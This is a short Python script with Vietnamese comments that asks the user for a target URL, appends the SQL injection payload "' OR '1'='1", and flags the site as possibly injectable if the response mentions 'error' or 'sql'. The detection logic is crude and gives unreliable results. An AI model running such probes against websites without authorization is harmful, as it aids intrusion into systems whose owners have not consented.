import requests  

print("Script đang chạy...")  # Debug xem script có thực sự chạy không

def check_sqli(url):  
    print(f"[🔍] Đang kiểm tra: {url}")  # Debug kiểm tra URL nhập vào

    payload = "' OR '1'='1"  
    full_url = url + payload  

    try:  
        res = requests.get(full_url, timeout=5)  
        
        if "error" in res.text.lower() or "sql" in res.text.lower():  
            print(f"[🔥] Có thể bị SQL Injection: {full_url}")  
        else:  
            print(f"[✅] Không phát hiện lỗi SQLi trên {url}")  

    except requests.exceptions.RequestException as e:  
        print(f"[❌] Lỗi kết nối hoặc timeout: {e}")  

if __name__ == "__main__":  
    target = input("Nhập URL mục tiêu (vd: http://example.com/index.php?id=): ")  
    print(f"[📝] Bạn đã nhập: {target}")  
    check_sqli(target)
